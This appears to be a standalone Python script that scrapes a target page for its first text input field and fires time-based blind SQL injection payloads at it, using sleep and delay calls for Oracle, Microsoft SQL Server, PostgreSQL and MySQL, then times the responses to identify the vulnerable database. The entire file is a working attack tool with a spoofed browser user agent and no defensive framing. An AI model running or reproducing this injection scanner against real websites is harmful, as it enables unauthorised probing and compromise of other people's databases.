import requests
from bs4 import BeautifulSoup
import time

_URL = ""
_Time_to_delay = 5
def set_params(url,time):
    global _URL, _Time_to_delay
    _URL = url
    _Time_to_delay = time

def requestToURL():
    response = requests.get(_URL)
    if response.status_code == 200:
        return str(response._content)
    return None

def getInputFieldFromHTML(html_content):
    if(html_content != None):
        soup = BeautifulSoup(html_content, 'html.parser')
        input_tags = soup.find_all('input', {'type': 'text'})
        for input_tag in input_tags:
            name_value = input_tag.get('name')
            return name_value
    return 'None'

def createPayload(field):
    timeDict = {
    "Oracle":f"dbms_pipe.receive_message(('a'),{_Time_to_delay})",
    "Microsoft":f"WAITFOR DELAY '0:0:{_Time_to_delay}'",
    "PostgreSQL":f"SELECT pg_sleep({_Time_to_delay})",
    "MySQL":f"SELECT SLEEP({_Time_to_delay})",
    }
    payloads = []
    for item in timeDict:
        value = "20';" + timeDict[item] + "--+"
        payload = {field:value}
        payloads.append([payload,item])
    return payloads

def send_request(payload):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "ngrok-skip-browser-warning": "foo"
    }
    start_time = time.time()
    response = requests.post(_URL, headers=headers, data=payload)
    end_time = time.time()
    return end_time - start_time

def main():
    field = getInputFieldFromHTML(requestToURL())
    payloads = createPayload(field)
    for i in range(len(payloads)):
        time = send_request(payloads[i][0])
        if(time >= _Time_to_delay):
            return(payloads[i][1])
    return None
